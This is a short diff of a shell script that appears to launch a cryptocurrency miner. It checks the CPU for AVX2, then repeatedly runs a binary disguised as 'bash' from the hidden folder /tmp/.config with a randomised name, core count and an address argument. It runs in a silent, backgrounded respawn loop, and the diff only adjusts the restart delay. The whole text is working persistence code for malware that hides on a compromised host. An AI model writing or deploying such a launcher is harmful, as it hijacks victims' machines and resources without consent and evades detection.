@@ -47,7 +47,7 @@ cat /proc/cpuinfo 2>/dev/null |grep -iq 'AVX2'
 
 if [ "$mode" == "0" ]; then
   name=`RandString 2 c${cores}_${addr}`;
-  bash -c "while true; do cd /tmp/.config; ./bash ${name} ${cores} >/dev/null 2>&1 ; sleep 3; done" >/dev/null 2>&1 &
+  bash -c "while true; do cd /tmp/.config; ./bash ${name} ${cores} >/dev/null 2>&1 ; sleep 5; done" >/dev/null 2>&1 &
 else
-  while true; do cd /tmp/.config; name=`RandString 2 d${cores}_${addr}`; ./bash ${name} ${cores} >/dev/null 2>&1 ; sleep 3; done
+  while true; do cd /tmp/.config; name=`RandString 2 d${cores}_${addr}`; ./bash ${name} ${cores} >/dev/null 2>&1 ; sleep 5; done
 fi
